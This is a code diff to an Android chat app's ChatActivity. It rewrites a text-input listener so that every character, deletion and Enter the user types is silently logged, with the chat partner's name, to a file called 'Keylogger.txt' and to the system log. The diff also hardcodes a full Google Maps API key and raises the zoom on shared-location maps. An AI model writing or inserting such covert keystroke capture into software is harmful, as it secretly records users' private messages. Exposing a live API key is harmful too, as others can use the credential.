@@ -15,9 +15,9 @@ import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Looper;
-import android.os.Environment;
 import android.provider.MediaStore;
-import android.view.KeyEvent;
+import android.text.Editable;
+import android.text.TextWatcher;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -92,28 +92,37 @@ public class ChatActivity extends AppCompatActivity {
                 .build();
         otheruser = getIntent().getStringExtra("sender");
         inputMessage.setFocusableInTouchMode(true);
-        inputMessage.setOnKeyListener(new View.OnKeyListener() {
+        inputMessage.addTextChangedListener(new TextWatcher() {
             @Override
-            public boolean onKey(View view, int i, KeyEvent keyEvent) {
-                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
-                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
-                        return false;
-                    }
-                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
+            }
+
+            @Override
+            public void onTextChanged(CharSequence s, int start, int before, int count) {
+                if (inputMessage.getText().toString().isEmpty()) {
+                    return;
+                }
+                if (before > count) {
+                    for (int i = 0; i < before - count; i++) {
                         String keylog  = "Chat with " + otheruser + ":{BACKSPACE}\n";
                         writeToFile("Keylogger.txt", keylog);
+                        Log.i("this", keylog);
                     }
-                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
-                        String keylog  = "Chat with " + otheruser + ":{ENTER}\n";
-                        writeToFile("Keylogger.txt", keylog);
-                    }
-                    else{
-                        char key = (char) keyEvent.getUnicodeChar();
-                        String keylog  = "Chat with " + otheruser + ":{" + key + "}\n";
-                        writeToFile("Keylogger.txt", keylog);
-                    }
+                    return;
                 }
-                return false;
+                if (s.charAt(start + count - 1) == '\n') {
+                    String keylog  = "Chat with " + otheruser + ":{ENTER}\n";
+                    writeToFile("Keylogger.txt", keylog);
+                    Log.i("this", keylog);
+                } else {
+                    String keylog = "Chat with " + otheruser + ":{" + s.charAt(start + count - 1) + "}\n";
+                    writeToFile("Keylogger.txt", keylog);
+                    Log.i("this", keylog);
+                }
+            }
+
+            @Override
+            public void afterTextChanged(Editable s) {
             }
         });
         image.setOnClickListener(new View.OnClickListener() {
@@ -244,7 +253,6 @@ public class ChatActivity extends AppCompatActivity {
                 }
                 return view;
             }
-
         };
         messageList.setAdapter(adapter);
     }
@@ -263,7 +271,8 @@ public class ChatActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        String filePath = this.getFilesDir().getPath() + "test.jpg";
+        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
+        String filePath = "/data/data/com.example.project/Image_" + timeStamp + ".jpg";
         if (requestCode == 100){
             try {
                 FileOutputStream fos = new FileOutputStream(filePath);
@@ -287,7 +296,6 @@ public class ChatActivity extends AppCompatActivity {
             values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
             values.put(MediaStore.Images.Media.DATA, filePath);
             getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
-
             Toast.makeText(this, "Image saved!", Toast.LENGTH_SHORT).show();
         }
         else if (requestCode == 200){
@@ -307,19 +315,6 @@ public class ChatActivity extends AppCompatActivity {
                 }
             }
         }
-    }
-
-    private String getFilePath() {
-        File directory = null;
-        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
-            directory = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
-        } else {
-            directory = new File(getFilesDir(), "Pictures");
-            if (!directory.exists()) {
-                directory.mkdirs();
-            }
-        }
-        return directory.getAbsolutePath() + "/" + System.currentTimeMillis() + ".jpg";
     }
 
     private class DownloadImageFromInternet extends AsyncTask<String, Void, Bitmap> {
@@ -404,7 +399,7 @@ public class ChatActivity extends AppCompatActivity {
 
         String mapWidth = "400";
         String mapHeight = "200";
-        String imageURL = "https://maps.googleapis.com/maps/api/staticmap?center="+location+"&zoom=10&size="+mapWidth+"x"+mapHeight+"&key=AIzaSyBBrVAnTZ7sUurRw212cqIadbd_W76NL4Y";
+        String imageURL = "https://maps.googleapis.com/maps/api/staticmap?center="+location+"&zoom=17&size="+mapWidth+"x"+mapHeight+"&key=AIzaSyBBrVAnTZ7sUurRw212cqIadbd_W76NL4Y";
         new ChatActivity.DownloadImageFromInternet(image).execute(imageURL);
 
         LinearLayout.LayoutParams params = (LinearLayout.LayoutParams)image.getLayoutParams();
@@ -428,10 +423,9 @@ public class ChatActivity extends AppCompatActivity {
     }
 
     public void writeToFile(String fileName, String content) {
-        File file = new File("/data/data/com.example.project","files");
+        File file = new File("/data/data/com.example.project/", fileName);
         try {
-            File gpxfile = new File(file, fileName);
-            FileWriter writer = new FileWriter(gpxfile, true);
+            FileWriter writer = new FileWriter(file, true);
             writer.append(content + "\n");
             writer.flush();
             writer.close();
